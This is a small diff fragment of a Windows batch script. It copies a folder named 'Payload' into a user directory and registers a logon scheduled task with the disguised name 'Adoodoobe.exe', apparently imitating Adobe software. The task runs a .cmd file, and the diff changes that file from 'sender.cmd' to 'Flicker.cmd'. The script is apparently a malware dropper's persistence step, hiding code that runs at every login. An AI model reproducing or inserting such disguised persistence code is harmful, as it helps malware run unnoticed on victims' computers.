@@ -25,6 +25,6 @@ robocopy "./Payload" "C://Users/%USERNAME%/scd/" /e /copyall
 
 :: creates new sceduled task to run on startup
 
-schtasks /create /sc ONLOGON /tn Adoodoobe.exe /tr "C://Users/%USERNAME%/scd/sender.cmd"
+schtasks /create /sc ONLOGON /tn Adoodoobe.exe /tr "C://Users/%USERNAME%/scd/Flicker.cmd"
 
 :end
